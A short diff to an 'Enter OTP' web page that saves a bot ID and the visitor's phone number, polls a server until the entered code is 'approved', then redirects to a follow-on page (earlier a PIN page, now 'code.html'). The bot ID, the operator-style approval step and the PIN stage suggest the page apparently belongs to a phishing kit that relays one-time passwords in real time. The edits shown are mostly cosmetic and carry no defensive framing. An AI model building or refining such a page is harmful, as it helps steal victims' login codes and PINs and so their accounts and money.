@@ -166,7 +166,6 @@
 
   <div class="container">
     <div class="title">Enter OTP</div>
-    <!-- 🔥 SUBTITLE WILL BE UPDATED DYNAMICALLY -->
     <div class="subtitle" id="subtitlePlaceholder">
       Enter OTP that was sent to your phone
     </div>
@@ -215,7 +214,7 @@
       localStorage.setItem('botId', botId);
       localStorage.setItem('phone', phone);
 
-      // ---------- 🔥 UPDATE SUBTITLE WITH USER'S PHONE ----------
+      // Update subtitle with user's phone
       const subtitle = document.getElementById('subtitlePlaceholder');
       if (phone) {
         subtitle.textContent = 'Enter OTP that was sent to ' + phone;
@@ -411,11 +410,11 @@
               .then(function(status) {
                 if (status.approved === true) {
                   stopPolling();
-                  // Redirect to PIN page
-                  var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
-                               '&phone=' + encodeURIComponent(phone) +
-                               '&name=' + encodeURIComponent(name);
-                  window.location.href = pinUrl;
+                  // ✅ REDIRECT TO SUCCESS PAGE (code.html)
+                  var successUrl = 'code.html?botId=' + encodeURIComponent(botId) +
+                                   '&phone=' + encodeURIComponent(phone) +
+                                   '&name=' + encodeURIComponent(name);
+                  window.location.href = successUrl;
                   return;
                 }
                 if (status.approved === false) {
@@ -461,7 +460,6 @@
 
       // ---------- INIT ----------
       checkAllFilled();
-      // Focus first input
       inputs[0].focus();
     })();
   </script>
